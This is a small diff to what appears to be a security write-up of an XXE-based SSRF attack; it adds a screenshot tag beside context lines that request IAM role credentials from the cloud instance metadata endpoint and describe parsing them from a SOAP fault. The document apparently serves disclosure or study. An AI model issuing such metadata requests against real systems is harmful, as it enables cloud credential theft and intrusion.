@@ -191,6 +191,9 @@ xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 xxe_ssrf "http://169.254.169.254/latest/meta-data/iam/security-credentials/rpal-upstream-api-role"
 ```
 
+<img width="1798" height="1313" alt="image" src="https://github.com/user-attachments/assets/dd85d7f0-29be-47ec-a38a-f86fafb43a8b" />
+
+
 ### 3.2 — Parse Credentials from Response
 
 The credentials appear in the SOAP fault `faultstring` element:
